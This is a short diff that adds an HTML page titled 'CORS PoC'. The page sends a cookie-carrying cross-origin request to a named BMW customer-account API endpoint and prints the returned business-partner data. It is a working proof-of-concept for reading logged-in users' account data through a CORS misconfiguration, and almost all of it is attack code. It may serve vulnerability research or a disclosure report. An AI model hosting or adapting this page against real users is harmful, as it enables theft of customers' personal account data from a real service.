@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h1>CORS Test</h1>
+  <button onclick="sendRequest()">Send CORS Request</button>
+  <pre id="result"></pre>
+
+  <script>
+    async function sendRequest() {
+      try {
+        const response = await fetch("https://customer.bmwgroup.com/gcdm/protected/v4/bmwmotorrad/DE-de/customers/businessPartners", {
+          method: "GET",
+          credentials: "include", // Important: sends cookies/session
+          headers: {
+            "X-Requested-With": "XMLHttpRequest"
+          }
+        });
+
+        const text = await response.text();
+        document.getElementById("result").textContent = text;
+      } catch (err) {
+        document.getElementById("result").textContent = "Request failed:\n" + err;
+      }
+    }
+  </script>
+</body>
+</html>
